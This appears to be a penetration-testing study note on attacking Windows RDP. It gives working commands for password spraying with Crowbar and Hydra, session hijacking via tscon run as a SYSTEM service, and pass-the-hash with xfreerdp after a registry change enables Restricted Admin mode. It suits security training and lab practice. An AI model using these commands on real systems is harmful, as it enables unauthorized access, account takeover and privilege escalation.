# Attacking RDP

We can use `Crowbar` to perform password spraying on RDP

```sh
crowbar -b rdp -s 192.168.220.142/32 -U usernames.txt -c 'password123'
```

We can also use `Hydra` to perform the same operation

```sh
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

We can login into target system using `rdesktop` or `xfreerdp`
#### RDP Login

```sh
rdesktop -u admin -p password123 192.168.2.143
```

## Protocol Specific Attacks

Let's imagine that we successfully have access on a machine with an account that has local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote session to escalate our privileges and impersonate the account.

### RDP Session Hijacking 

![[RDP Session Hijacking.png]]

As show in the image above. Our user `juurena` (With ID 2), has admin privileges. Our goal is to hijack `lewen`'s with ID 4 session.

To successfully impersonate a user without their password. We need to have `SYSTEM` privileges on the host and use Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop application.

**Command Syntax:**

```powershell
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

```ad-note
If we have local admin privs. We can use tools like **PSExec** or **Mimikatz** to obtain SYSTEM privileges.
```

In this approach, we are going to use `Microsoft sc.exe` to obtain `SYSTEM` privileges.

```powershell
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

To run the command, we can start the `sessionhijack` service

```powershell
net start sessionhijack
```

```ad-warning
This method no longer works on Server 2019
```

---

## RDP Pass-the-Hash (PtH)

Sometimes we have an NTLM hash for a user and we can't crack it. So we can use `xfreerdp` to RDP into the host using the hash. But there are few caveats for this attack:

- **Restricted Admin Mode** which is disabled by default, should be enabled on target host; otherwise, we will be prompted with an error.

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.

Can be done wit the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once done, we can use `xfreerdp` with `/pth` option:

```sh
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

